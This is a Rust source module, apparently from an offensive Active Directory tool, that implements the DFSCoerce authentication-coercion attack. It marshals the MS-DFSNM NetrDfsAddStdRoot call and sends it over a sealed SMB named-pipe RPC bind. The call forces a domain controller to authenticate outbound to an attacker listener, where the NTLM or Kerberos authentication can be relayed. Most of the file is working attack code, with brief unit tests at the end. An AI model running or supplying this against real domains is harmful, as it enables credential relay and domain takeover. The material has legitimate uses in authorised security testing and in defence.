//! MS-DFSNM coercion (DFSCoerce) — `NetrDfsAddStdRoot` forces the DC to open a DFS root on
//! an attacker-controlled server name, triggering outbound NTLM/Kerberos auth (relayable).
//! Rides the SMB named-pipe DCE/RPC transport on `\netdfs`.

use crate::ndr::NdrEncoder;
use crate::transport::SmbPipe;
use crate::{Result, Syntax};
use smb2_client::SmbClient;

/// The Netdfs interface (MS-DFSNM), v3.0.
pub fn dfsnm_syntax() -> Syntax {
    Syntax::new("4fc742e0-4a10-11cf-8273-00aa004ae673", 3, 0)
}

/// `NetrDfsAddStdRoot` — opnum 12.
pub const OPNUM_ADD_STD_ROOT: u16 = 12;

/// `NetrDfsAddStdRoot(ServerName, RootShare, Comment, ApiFlags)` — three `[in,string] WCHAR*`
/// plus a DWORD. The DC opens `\\ServerName\RootShare` to set up the root, auth'ing outbound.
pub fn encode_add_std_root(server_name: &str, root_share: &str, comment: &str) -> Vec<u8> {
    let mut e = NdrEncoder::new();
    e.referent();
    e.conformant_varying_wstr(server_name);
    e.referent();
    e.conformant_varying_wstr(root_share);
    e.referent();
    e.conformant_varying_wstr(comment);
    e.u32(0); // ApiFlags
    e.into_bytes()
}

pub struct CoerceClient<'a> {
    pipe: SmbPipe<'a>,
}

impl<'a> CoerceClient<'a> {
    /// Sealed bind (RPC packet-privacy). MS-DFSNM 3.1.4 requires PKT_PRIVACY on the netdfs
    /// interface — Server 2016+ enforces this. Reuses the SMB session's credentials for the
    /// RPC-level NTLM.
    pub async fn bind_sealed(
        client: &'a mut SmbClient,
        file_id: [u8; 16],
        domain: &str,
        user: &str,
        password: &str,
        host: &str,
    ) -> Result<Self> {
        let mut pipe = SmbPipe::new(client, file_id);
        pipe.bind_sealed(dfsnm_syntax(), domain, user, password, host)
            .await?;
        Ok(CoerceClient { pipe })
    }

    /// Fire `NetrDfsAddStdRoot` at the attacker listener. Returns the Win32 return code —
    /// a non-fault response means the DC processed the call (coercion attempted). Full auth
    /// capture requires a relay/listener on the attacker host (out of tool scope).
    pub async fn coerce(&mut self, listener: &str) -> Result<u32> {
        let resp = self
            .pipe
            .call_sealed(
                OPNUM_ADD_STD_ROOT,
                &encode_add_std_root(listener, "share", "adhammer"),
            )
            .await?;
        let status = resp
            .len()
            .checked_sub(4)
            .and_then(|o| resp.get(o..o + 4))
            .map(|b| u32::from_le_bytes(b.try_into().unwrap()))
            .unwrap_or(0);
        Ok(status)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn add_std_root_marshals_three_strings_and_flags() {
        let stub = encode_add_std_root("10.0.0.1", "share", "x");
        // Three (referent + string) pairs, then ApiFlags = 0 at the tail.
        assert_ne!(u32::from_le_bytes(stub[0..4].try_into().unwrap()), 0); // first referent
        assert_eq!(&stub[stub.len() - 4..], &[0, 0, 0, 0]); // ApiFlags
    }

    #[test]
    fn empty_strings_still_marshal() {
        // The RPC layer accepts empty strings (server rejects — that's a live-side concern).
        let _ = encode_add_std_root("", "", "");
    }
}
